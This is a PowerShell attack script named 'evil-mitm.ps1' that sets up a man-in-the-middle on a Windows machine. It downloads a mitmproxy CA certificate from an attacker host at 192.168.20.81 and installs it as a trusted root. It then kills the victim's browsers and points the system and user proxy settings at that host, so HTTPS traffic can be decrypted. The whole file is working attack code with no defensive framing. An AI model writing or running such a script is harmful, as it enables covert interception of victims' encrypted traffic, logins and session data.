# evil-mitm.ps1 - Drop in same folder on your evil server

# Set TLS 1.2 for all PowerShell web requests
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Download and add CA cert to Trusted Root
Invoke-WebRequest -Uri "http://192.168.20.81:8081/mitmproxy-ca-cert.cer" -OutFile "$env:TEMP\mitm.cer"
certutil -addstore -f "Root" "$env:TEMP\mitm.cer"
Remove-Item "$env:TEMP\mitm.cer" -ErrorAction SilentlyContinue

# Kill browsers to flush CA cache
Get-Process chrome,firefox,msedge -ErrorAction SilentlyContinue | Stop-Process -Force

# Set WinHTTP proxy
netsh winhttp set proxy "192.168.20.81:8080"

# Set user Internet proxy settings
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyEnable -Value 1
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyServer -Value "192.168.20.81:8080"
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyOverride -Value ""

# Restart explorer to apply new settings
Stop-Process -Name explorer -Force
Start-Process explorer
